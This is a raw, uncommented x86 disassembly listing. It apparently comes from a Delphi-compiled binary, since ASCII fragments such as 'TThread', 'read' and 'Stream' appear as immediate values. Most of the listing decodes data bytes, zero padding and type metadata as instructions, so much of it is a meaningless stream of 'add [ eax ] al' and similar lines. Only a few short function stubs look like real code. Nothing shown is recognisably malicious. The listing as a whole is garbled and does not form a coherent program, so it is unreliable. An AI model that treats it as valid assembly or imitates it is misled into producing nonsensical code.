push 0x64616572
dec esp
imul esi [ ebx + 0x74 ] r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
in al dx
adc al 0x41
add [ eax + eax ] cl
add [ eax ] al
mov al [ 0x20004010 ]
xor eax [ eax ]
sub al 0x33
inc eax
add [ eax ] dh
xor eax [ eax ]
xor al 0x33
inc eax
add [ eax ] ch
xor eax [ eax ]
mov [ eax ] dh
inc eax
add [ eax + esi + 0x3c940040 ] ah
inc ecx
add [ 0x74694254 ] al
jae r-xdata
inc eax
add [ ebx + esi ] dh
rol [ eax + 0x15 ] 0x41
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebp + edx + 0x41 ] ch
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebp + edx + 0x41 ] cl
add [ edx + 0x15 ] bl
inc ecx
add [ eax + eax ] al
add [ eax ] al
mov al [ 0x20004010 ]
xor eax [ eax ]
sub al 0x33
inc eax
add [ eax ] dh
xor eax [ eax ]
xor al 0x33
inc eax
add [ eax ] ch
xor eax [ eax ]
mov [ eax ] dh
inc eax
add [ eax + esi + 0x3e300040 ] ah
inc ecx
add [ eax + 0x3f ] al
inc ecx
add [ eax + 0x3f ] cl
inc ecx
add [ esi + edi + 0x41 ] bl
add [ edx ] al
add bh bh
sub_4114f8
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
insb
adc eax 0x41
add [ eax ] al
add [ eax ] al
add [ eax ] al
dec esp
adc eax 0x155a0041
inc ecx
add [ eax + eax ] al
add [ eax ] al
mov al [ 0x20004010 ]
xor eax [ eax ]
sub al 0x33
inc eax
add [ eax ] dh
xor eax [ eax ]
xor al 0x33
inc eax
add [ eax ] ch
xor eax [ eax ]
mov [ eax ] dh
inc eax
add [ eax + esi + 0x3e300040 ] ah
inc ecx
add [ eax + 0x3f ] al
inc ecx
add [ eax + 0x3f ] cl
inc ecx
add [ esi + edi + 0x41 ] bl
add [ edx ] al
add bh bh
sub_4115b5
xchg ecx eax
adc eax 0x159f0041
inc ecx
add [ ecx + 0x1004115 ] ch
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc esi
mov ch 0x15
inc ecx
add [ eax ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebp + 0x16300040 ] cl
inc ecx
add cl al
adc eax 0x41
add [ eax ] al
inc eax
push ss
inc ecx
add [ esi + edx + 0x41 ] ch
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + 0x16 ] dl
inc ecx
add [ eax + eax ] cl
add [ eax ] al
hlt
sub_411898
push cs
or edx [ ebx + edx * 2 + 0x74 ]
jb r-xdata
and al 0x47
outsb
dec ecx
je r-xdata
add [ eax + esi + 0x30e00040 ] ah
inc eax
add al bl
pop eax
inc ecx
imul ebp [ esi + 0x67 ] 0x7473694c
lodsb [ esi ]
sbb [ ecx ] eax
pop es
or edx [ ebx + edx * 2 + 0x74 ]
jb r-xdata
inc ecx
add [ esi + eax * 2 ] bl
inc ecx
add al bh
push esp
inc ecx
add [ edx * 2 + 0x55300041 ] ch
inc ecx
add [ edx * 2 + 0x4a080041 ] dh
inc ecx
add [ eax + 0x4004156 ] ch
push edi
inc ecx
add al bl
push edi
inc ecx
add al cl
push eax
inc ecx
add [ eax + ebx * 2 ] dl
inc ecx
add [ eax - 0x53ffbea8 ] cl
push edx
inc ecx
add [ eax + 0x64004152 ] bh
inc ebp
inc ecx
add [ ebx + edx * 2 + 0x41 ] dl
add [ ebx + edx * 2 + 0x54000041 ] dl
inc ecx
add [ ecx + ecx * 2 + 0x55900041 ] dh
inc ecx
add [ ebx + ecx * 2 + 0x4c900041 ] bh
inc ecx
add ah cl
push ebp
inc ecx
add ah bl
push ebp
inc ecx
add ah dh
dec esp
inc ecx
add [ eax + 0x4d ] cl
inc ecx
add ah dh
dec ebp
inc ecx
add [ edi + ecx * 2 + 0x4fe40041 ] cl
inc ecx
add [ eax + 0x50 ] bh
inc ecx
add [ ebx + edx * 2 ] bl
inc ecx
add [ eax ] bh
push ebx
inc ecx
add [ eax ] dh
push esi
inc ecx
add [ eax + 0x40004154 ] al
pop eax
inc ecx
add [ eax + 0x58 ] dl
inc ecx
add [ ebx ] cl
push esp
push ebx
je r-xdata
inc edi
insd
or [ eax ] al
add [ eax ] al
add [ eax ] eax
add [ eax ] al
xchg esp eax
adc [ eax ] al
add [ eax ] al
add [ eax ] al
lea eax [ eax ]
add al 0x19
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx + ebx + 0x41 ] ch
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
pushfd
sbb [ ecx ] eax
xor [ eax ] al
add [ eax ] al
mov [ edi ] dl
inc ecx
add [ eax ] ah
xor eax [ eax ]
sub al 0x33
inc eax
add [ eax ] dh
xor eax [ eax ]
xor al 0x33
inc eax
add [ eax ] ch
xor eax [ eax ]
mov [ eax ] dh
inc eax
add [ eax + esi + 0x52500040 ] ah
inc ecx
add [ eax + 0x3f ] al
inc ecx
add [ edi + eax * 2 ] ah
push ebx
je r-xdata
popad
add [ ecx + ebx * 2 ] ah
inc ecx
add [ ecx + ebx * 2 ] bh
inc ecx
add [ ecx + ebp ] ch
inc eax
add [ ecx + ebp ] ch
inc eax
add ah bl
pop ecx
inc ecx
add [ eax + 0x5a ] ah
inc ecx
add [ edi ] al
push esp
push ebx
je r-xdata
fcomp [ eax + 0x41 ]
outsb
dec esp
imul esi [ ebx + 0x74 ] r-xdata
jo r-xdata
push ebx
je r-xdata
popad
insd
mov eax eax
add al 0x1b
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] ah
sbb eax [ ecx ]
or [ eax ] al
add [ eax ] al
inc eax
sbb al [ ecx ]
and [ ebx ] dh
inc eax
add [ ebx + esi ] ch
inc eax
add [ eax ] dh
xor eax [ eax ]
xor al 0x33
inc eax
add [ eax ] ch
xor eax [ eax ]
mov [ eax ] dh
inc eax
add [ eax + esi + 0x5ef00040 ] ah
inc ecx
add al bl
pop eax
inc ecx
add [ ebx * 2 + 0x5d300041 ] bl
inc ecx
add al dl
pop esp
inc ecx
add al ah
pop esp
inc ecx
add ah bl
pop ecx
inc ecx
add al dh
pop esp
inc ecx
add [ ebx ] cl
push esp
inc esi
imul ebp [ ebp + 0x53 ] 0x61657274
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] bh
sbb al [ ecx ]
add al 0x0
add [ eax ] al
mov al [ 0x20004010 ]
xor eax [ eax ]
sub al 0x33
inc eax
add [ eax ] dh
xor eax [ eax ]
xor al 0x33
inc eax
add [ eax ] ch
xor eax [ eax ]
mov [ eax ] dh
inc eax
inc ecx
add [ eax ] al
add [ edi ] al
inc ebx
insb
popad
jae r-xdata
insd
dec ebp
insd
outsd
jb r-xdata
insd
js r-xdata
popad
add [ eax ] al
add [ ebx + ebx + 0x100041 ] dl
add [ eax ] al
rcr [ ecx ] 0x1
inc ecx
add [ eax ] ah
xor eax [ eax ]
sub al 0x33
inc eax
add [ eax ] dh
xor eax [ eax ]
xor al 0x33
inc eax
add [ eax ] ch
xor eax [ eax ]
mov [ eax ] dh
inc eax
add [ eax + esi + 0x30e00040 ] ah
inc eax
add al bl
pop eax
inc ecx
add [ ecx + ebx * 2 ] ah
inc ecx
add [ ecx + ebx * 2 ] bh
inc ecx
add [ edi + ebx * 2 ] ch
inc ecx
add [ ecx + ebp ] ch
inc eax
add [ edi + ebx * 2 + 0x41 ] ah
add [ eax + 0x5a ] ah
inc ecx
add [ ebx ] dl
push esp
inc ebx
jne r-xdata
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
jb r-xdata
jae r-xdata
jns r-xdata
push ebx
je r-xdata
pushad
pop edx
je r-xdata
add al dh
pop esp
inc ecx
add [ 0x6e614854 ] cl
insb
insd
mov [ edx ] ds
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x800411a ] ch
add [ eax ] al
add al dl
sbb [ ecx ] eax
and [ ebx ] dh
inc eax
add [ ebx + esi ] ch
inc eax
add [ eax ] dh
xor eax [ eax ]
xor al 0x33
inc eax
add [ eax ] ch
xor eax [ eax ]
mov [ eax ] dh
inc eax
add [ eax + esi + 0x30e00040 ] ah
inc eax
add al bl
pop eax
inc ecx
add [ ebx * 2 + 0x5d300041 ] bl
inc ecx
add al dl
pop esp
inc ecx
add al ah
pop esp
inc ecx
add ah bl
pop ecx
inc ecx
popad
add [ ebp + 0x1a1c0040 ] cl
inc ecx
add [ eax ] al
add [ eax ] al
fcomp [ eax + 0x41 ]
je r-xdata
outsd
jb r-xdata
insd
popad
insd
hlt
push ebx
push ebx
inc ecx
add [ eax + 0x60 ] bl
inc ecx
add [ 0x6d654d54 ] cl
inc ecx
add [ eax + 0x5a ] ah
and al 0x4
in al dx
mov eax [ esp + 0x4 ]
jne r-xdata
outsd
popad
insd
mov eax eax
jo r-xdata
pushad
and al 0x83
inc esp
and al 0x4
in al dx
mov eax [ esp + 0x4 ]
mov eax [ eax ]
jmp [ eax + 0x28 ]
popad
insd
int3
mov eax [ eax ]
jmp [ eax + 0x24 ]
and al 0x4
je r-xdata
arpl [ ebp + 0x53 ] sp
add [ ecx + ebx * 2 ] ah
inc ecx
add [ ecx + ebx * 2 ] bh
inc ecx
add [ edi + ebx * 2 ] ch
inc ecx
add [ eax + 0x64004162 ] ah
pop edi
inc ecx
add [ eax + 0x5a ] ah
inc ecx
add [ edi ] cl
push esp
push edx
jae r-xdata
add [ eax ] al
mov [ ecx + eax * 2 ] ds
add [ eax ] bl
add [ eax ] al
add [ ebx + ebx ] ch
inc ecx
add [ eax ] ah
xor eax [ eax ]
sub al 0x33
inc eax
add [ eax ] dh
xor eax [ eax ]
xor al 0x33
inc eax
add [ eax ] ch
xor eax [ eax ]
mov [ eax ] dh
inc eax
add [ eax + esi + 0x62680040 ] ah
inc ecx
add al bl
pop eax
inc ecx
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esp + ebx + 0x180041 ] cl
add [ eax ] al
sub al 0x1b
sub_411bac
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc al 0x1c
inc ecx
add [ eax + eax ] dl
add [ eax ] al
sub al 0x1b
inc ecx
add [ eax ] ah
xor eax [ eax ]
sub al 0x33
inc eax
add [ eax ] dh
xor eax [ eax ]
xor al 0x33
inc eax
add [ eax ] ch
xor eax [ eax ]
mov [ eax ] dh
inc eax
add [ eax + esi + 0x5f880040 ] ah
inc ecx
add al bl
pop eax
inc ecx
add [ eax ] ch
inc ecx
add [ ecx + ebx * 2 ] bh
inc ecx
add [ edi + ebx * 2 ] ch
inc ecx
add ah ah
pushad
inc ecx
add [ edi + ebx * 2 + 0x41 ] ah
add [ eax + 0x5a ] ah
inc ecx
add [ eax + 0x60 ] bl
inc ecx
add [ 0x6d654d54 ] cl
outsd
jb r-xdata
push ebx
push ebx
je r-xdata
pushad
and al 0x83
inc esp
and al 0x4
in al dx
mov eax [ esp + 0x4 ]
mov eax [ eax ]
jmp [ eax + 0x28 ]
popad
insd
int3
outsd
popad
insd
mov eax eax
jo r-xdata
and al 0x4
je r-xdata
arpl [ ebp + 0x53 ] sp
add [ eax ] al
mov [ ecx + eax * 2 ] ds
add [ eax ] bl
add [ eax ] al
add [ ebx + ebx ] ch
inc ecx
add [ eax ] ah
xor eax [ eax ]
sub al 0x33
inc eax
add [ eax ] dh
xor eax [ eax ]
xor al 0x33
inc eax
add [ eax ] ch
xor eax [ eax ]
mov [ eax ] dh
inc eax
add [ eax + esi + 0x62680040 ] ah
inc ecx
add al bl
pop eax
inc ecx
add [ ecx + ebx * 2 ] ah
inc ecx
add [ ecx + ebx * 2 ] bh
inc ecx
add [ edi + ebx * 2 ] ch
inc ecx
add [ eax + 0x64004162 ] ah
pop edi
inc ecx
add [ eax + 0x5a ] ah
inc ecx
add [ edi ] cl
push esp
push edx
jae r-xdata
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esp + ebx + 0x180041 ] cl
add [ eax ] al
sub al 0x1b
mov eax [ eax ]
jmp [ eax + 0x24 ]
and al 0x4
in al dx
mov eax [ esp + 0x4 ]
jne r-xdata
sub_411db4
mov ds [ 0x41 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
popad
insd
inc ecx
popad
jo r-xdata
or al 0x0
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + edx + 0x700040 ] dl
add [ eax ] al
pop es
push esp
push edx
popad
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al dh
push ds
inc ecx
add [ eax ] ch
add [ eax ] al
add [ eax + 0x20004010 ] ah
xor eax [ eax ]
sub al 0x33
inc eax
add [ eax ] dh
xor eax [ eax ]
xor al 0x33
inc eax
add [ eax ] ch
xor eax [ eax ]
mov [ eax ] dh
inc eax
add [ eax + esi + 0x63000040 ] ah
inc ecx
add [ eax ] ch
arpl [ ecx ] ax
sub al 0x29
inc eax
add [ ecx + ebp ] ch
inc eax
add [ ecx + ebp ] ch
inc eax
add [ esi ] al
push esp
inc esi
imul ebp [ ebp + 0x72 ] 0x411f4490
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi + ebx + 0x41 ] ch
jb r-xdata
aam 0x8b
inc esp
and al 0x4
mov eax [ eax ]
jmp [ eax + 0x28 ]
outsb
outsb
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
jle r-xdata
add [ eax ] al
xor al 0x6d
inc eax
add [ eax ] ah
xor eax [ eax ]
sub al 0x33
inc eax
add [ eax ] dh
xor eax [ eax ]
xor al 0x33
inc eax
add [ eax ] ch
xor eax [ eax ]
mov [ eax ] dh
inc eax
add [ eax + esi + 0x30e00040 ] ah
inc eax
add [ edi ] al
inc ebp
push esp
push 0x64616572
sub [ eax ] ah
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] dh
and [ ecx ] al
cmp al 0x0
add [ eax ] al
mov al [ 0x20004010 ]
xor eax [ eax ]
or [ eax + 0x33300041 ] bl
inc eax
add [ ebx + esi ] dh
inc eax
add [ eax ] ch
xor eax [ eax ]
mov [ eax ] dh
inc eax
add [ eax + esi - 0x685fffc0 ] ah
inc ecx
add [ eax + ebx * 4 + 0x292c0041 ] bh
inc eax
add [ edi ] al
push esp
push esp
push 0x64616572
cmp al 0x20
inc ecx
add [ edx ] cl
push cs
push esp
inc ebx
outsd
insd
jo r-xdata
rcl ah 0x1f
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah dl
pop ds
inc ecx
add [ eax + eax ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sub [ esi ] bl
inc ecx
add [ eax ] bl
add [ eax ] al
add [ ecx + edx + 0x33200040 ] dl
inc eax
add [ eax + 0x55 ] ch
inc eax
add [ ebp + edx * 2 + 0x40 ] dh
add [ ebx + esi ] dh
inc eax
add [ eax ] ch
xor eax [ eax ]
test [ ebp + 0x40 ] dl
add [ eax + esi - 0x59b3ffc0 ] ah
inc ecx
add [ esi - 0x5913ffbf ] al
inc ecx
add [ edi + 0x41 ] dl
add al bl
cmpsd [ esi ] [ edi ]
inc ecx
add [ eax + ebp * 4 ] bh
inc ecx
add [ edx + ebp * 4 ] bh
inc ecx
add [ eax - 0x56 ] cl
inc ecx
add [ edx + ebp * 4 + 0x41 ] dl
add [ eax - 0x56 ] ah
inc ecx
add [ edx + ebp * 4 + 0x41 ] ch
add al ch
stosb [ edi ]
inc ecx
add [ esi ] cl
push esp
push ebx
je r-xdata
test [ esi ] bl
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + ebx + 0x80041 ] al
add [ eax ] al
mov al [ 0x20004010 ]
xor eax [ eax ]
sub al 0x33
inc eax
add [ eax ] dh
xor eax [ eax ]
xor al 0x33
inc eax
add [ eax ] ch
xor eax [ eax ]
mov [ eax ] dh
inc eax
add [ eax + esi + 0x2e3c0040 ] ah
inc ecx
add [ esp + edx * 2 ] cl
inc ebx
insb
popad
jae r-xdata
add bh bh
pushad
sub [ ebx - 0x27fbdbbc ] al
jmp r-xdata
popad
insd
push eax
and [ ecx ] al
add [ edx + ebp * 2 + 0x41 ] dl
add [ eax + 0x6d ] ch
inc ecx
add [ ebx + ebp * 2 + 0x41 ] al
add [ eax - 0x74 ] dh
inc ecx
add [ ebx + ebp * 2 + 0x41 ] ah
add [ eax - 0x73 ] al
inc ecx
add [ eax ] ch
lea eax [ ecx ]
movsb [ edi ] [ esi ]
jpe r-xdata
xor [ eax ] al
movsb [ edi ] [ esi ]
xor [ eax ] al
shr [ ecx + 0x41 ] 0x0
sub [ ebx + 0x41 ] ah
add [ eax ] ah
push 0x41
inc ecx
add [ eax + eax ] bh
add [ esi + ebx + 0x33200041 ] dl
inc eax
add [ ebx + esi ] ch
inc eax
add [ eax ] dh
xor eax [ eax ]
xor al 0x33
inc eax
add [ eax ] ch
xor eax [ eax ]
mov [ eax ] dh
inc eax
add [ eax + esi + 0x69c00040 ] ah
inc ecx
add [ eax ] ch
arpl [ ecx ] ax
and [ edx + 0x41 ] ch
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + 0x1f ] bh
add [ eax ] al
add [ eax ] al
add [ eax ] al
insb
pop ds
inc ecx
inc esi
imul ebp [ esi + 0x64 ] 0x408d7265
add al ah
push ds
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x20 ] 0x0
jne r-xdata
mov eax [ eax + 0x20 ]
push eax
mov eax [ eax ]
call [ eax + 0x4 ]
or eax 0xffffffff
jmp r-xdata
pop ebp
retn 0x4
sub_411f8c
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
aam 0x1f
inc ecx
add [ eax + eax ] cl
add [ eax ] al
xor al 0x6d
inc eax
add [ eax ] ah
xor eax [ eax ]
sub al 0x33
inc eax
add [ eax ] dh
xor eax [ eax ]
xor al 0x33
inc eax
add [ eax ] ch
xor eax [ eax ]
mov [ eax ] dh
inc eax
add [ eax + esi + 0x30e00040 ] ah
inc eax
add [ edi ] al
inc ebp
push esp
push 0x64616572
sub [ eax ] ah
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] dh
and [ ecx ] al
cmp al 0x0
add [ eax ] al
mov al [ 0x20004010 ]
xor eax [ eax ]
or [ eax + 0x33300041 ] bl
inc eax
add [ ebx + esi ] dh
inc eax
add [ eax ] ch
xor eax [ eax ]
mov [ eax ] dh
inc eax
add [ eax + esi - 0x685fffc0 ] ah
inc ecx
add [ eax + ebx * 4 + 0x292c0041 ] bh
inc eax
add [ edi ] al
push esp
push esp
push 0x64616572
cmp al 0x20
inc ecx
add [ edx ] cl
push cs
push esp
inc ebx
outsd
insd
jo r-xdata
aam 0x8b
inc esp
and al 0x4
mov eax [ eax ]
jmp [ eax + 0x28 ]
outsb
outsb
je r-xdata
add bh bh
pushad
sub [ ebx - 0x27fbdbbc ] al
jmp r-xdata
popad
insd
push eax
and [ ecx ] al
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x20 ] 0x0
jne r-xdata
mov eax [ eax + 0x20 ]
push eax
mov eax [ eax ]
call [ eax + 0x4 ]
or eax 0xffffffff
jmp r-xdata
pop ebp
retn 0x4
sub_412056
imul esp [ edi + 0x6e ] 0x6f4e7265
je r-xdata
inc esp
and al 0x4
aam 0xe9
sub eax [ edx - 0x72340000 ]
and [ ecx ] al
fwait
and [ ecx ] al
movsd [ edi ] [ esi ]
and [ ecx ] al
test [ eax ] esp
inc ecx
add [ edi - 0x42ffbee0 ] ch
and [ ecx ] al
jns r-xdata
pop es
inc ebx
insb
popad
jae r-xdata
adc [ eax ] eax
add [ edi ] eax
call 0xffffffffe3e7d9dd
rcl [ ecx ] 0x1
stosb [ edi ]
mov cl 0x0
ror [ edi - 0x4f ] 0x6f
mov esp 0x616c4307
add [ eax ] al
add [ eax + 0x18 ] bl
mov esp edx
xchg ah ch
pop ecx
inc ebp
jae r-xdata
dec [ ebx - 0x3f7c3340 ]
fsubr st1
pop [ edx + 0x44830000 ]
and al 0x4
fmul [ ebx - 0x74fbdbbc ]
add bh bh
pushad
sub [ ebx - 0x27fbdbbc ] al
jmp r-xdata
add bh bh
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x20 ] 0x0
jne r-xdata
mov eax [ eax + 0x20 ]
push eax
mov eax [ eax ]
call [ eax + 0x4 ]
or eax 0xffffffff
jmp r-xdata
pop ebp
retn 0x4
sub_4120fb
int 0x6b
dec edi
add [ ecx + 0x51 ] 0xed
shl [ eax ] cl
inc ecx
add [ eax ] ch
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc esi
loop r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov edx 0x1c004121
inc ecx
add [ eax + eax ] ch
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov eax eax
js r-xdata
add [ eax ] dh
add [ eax ] al
add ah dh
adc al 0x41
add [ edx + 0x41 ] bh
add [ ebx + esi ] ch
inc eax
add al dl
fwait
inc ecx
add [ ebx + esi ] dh
inc eax
add [ eax ] ch
xor eax [ eax ]
mov [ eax ] dh
inc eax
add [ eax + esi - 0x64a7ffc0 ] ah
inc ecx
add [ eax + 0x3f ] al
inc ecx
add [ esi + ebx * 4 + 0x3e5c0041 ] al
inc ecx
add [ edi + ebx * 4 + 0x41 ] bl
add [ eax ] ch
sahf
inc ecx
add [ edi + ebx * 4 + 0x41 ] ch
add [ eax + 0x41 ] ah
add [ edx - 0x6083ffbf ] dl
inc ecx
add [ edi + ebx * 4 + 0x41 ] dh
add [ edx - 0x64f3ffbf ] bl
inc ecx
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax ] bh
and [ ecx ] al
or [ eax ] al
add [ eax ] al
adc [ eax ] al
std
and al [ ecx ]
xor [ eax ] al
add [ eax ] al
hlt
inc ecx
add dh ch
and [ ecx ] al
add [ eax ] al
add [ eax ] al
test al 0x21
inc ecx
add [ edx ] ch
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + 0x1c004121 ] bh
sub_4121d7
push ecx
push eax
call [ eax ]
lahf
inc ecx
add [ eax ] bl
lahf
inc ecx
add [ edi + ebx * 4 ] bl
inc ecx
add [ edi + ebx * 4 ] dh
inc ecx
add [ eax - 0x61 ] ch
inc ecx
add [ eax ] bh
lahf
inc ecx
add [ eax - 0x61 ] al
inc ecx
add [ edi + ebx * 4 + 0x41 ] al
add [ eax - 0x61 ] dl
inc ecx
add ah bh
lahf
inc ecx
add [ eax ] dl
mov al [ 0xffffffffa22c0041 ]
inc ecx
add [ edi + ebx * 4 ] bh
inc ecx
add [ eax ] ah
lahf
inc ecx
add [ edi + ebx * 4 ] cl
inc ecx
add [ edx + 0x41 ] dl
add [ edx ] cl
push esp
inc ebx
outsd
insd
jo r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
clc
outsb
outsb
je r-xdata
add [ eax + 0x6c0041a4 ] bh
arpl [ ecx + 0x63 ] ax
je r-xdata
add [ eax ] al
adc [ eax ] al
std
sub al 0x22
inc ecx
add [ edi ] al
or dl [ ebx + eax * 2 + 0x6f ]
insd
jo r-xdata
lahf
inc ecx
add [ eax + 0x41 ] ah
add [ edx - 0x6083ffbf ] dl
inc ecx
add [ edi + ebx * 4 + 0x41 ] dh
add [ edx - 0x5bebffbf ] bl
inc ecx
add [ eax - 0x5b ] bh
inc ecx
add [ 0xffffffffa4b00041 ] bl
inc ecx
add al ah
movsb [ edi ] [ esi ]
inc ecx
add [ esp - 0x5affffbf ] dh
inc ecx
add [ ecx ] al
add bh ch
jmp esp
insb
outsd
outsb
dec esp
imul ebp [ esi + 0x6b ] 0x5800408d
and eax [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov esp 0x4123
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x57ffbedd ] ah
and eax [ ecx ]
push esp
add [ eax ] al
add [ ecx ] ch
inc ecx
add [ edx + 0x41 ] bh
add [ ebx + esi ] ch
inc eax
add al dl
fwait
inc ecx
add [ ebx + esi ] dh
inc eax
add [ eax ] ch
xor eax [ eax ]
mov [ eax ] dh
inc eax
add [ eax + esi - 0x5ba7ffc0 ] ah
inc ecx
add [ eax + 0x3f ] al
inc ecx
add [ esi + ebx * 4 + 0x3e5c0041 ] al
inc ecx
add [ edi + ebx * 4 + 0x41 ] bl
and al [ ecx ]
adc al 0x0
add [ eax ] al
mov al [ 0x20004010 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al bh
outsb
outsb
je r-xdata
xor eax [ eax ]
sub al 0x33
add [ eax ] al
add [ eax + 0x20004010 ] ah
and [ ecx ] eax
push 0x2004115
add [ edi ] al
inc ebx
insb
popad
jae r-xdata
inc eax
add [ eax ] dh
xor eax [ eax ]
xor al 0x33
inc eax
add [ eax ] ch
xor eax [ eax ]
mov [ eax ] dh
inc eax
add [ eax + esi - 0x5c97ffc0 ] ah
inc ecx
add [ ebx + 0x41 ] ah
add [ ebx - 0x5c03ffbf ] bl
inc ecx
add al dl
mov [ 0xffffffffa4000041 ] eax
inc ecx
add [ eax ] ah
mov [ 0xffffffffa3b40041 ] eax
inc ecx
add [ eax ] cl
movsb [ edi ] [ esi ]
inc ecx
add [ eax ] dl
push esp
inc edx
popad
jae r-xdata
add [ ebx + esi ] ch
jae r-xdata
and [ ecx ] al
or [ eax ] al
add bh bh
sbb [ eax ] al
add dh bh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add [ eax ] al
add al 0x4e
popad
insd
cmp al 0x10
inc eax
add [ eax + eax ] cl
add bh bh
or al 0x0
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] eax
add edx [ ecx + 0x67 ]
lea eax [ eax ]
fsub [ edx ]
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
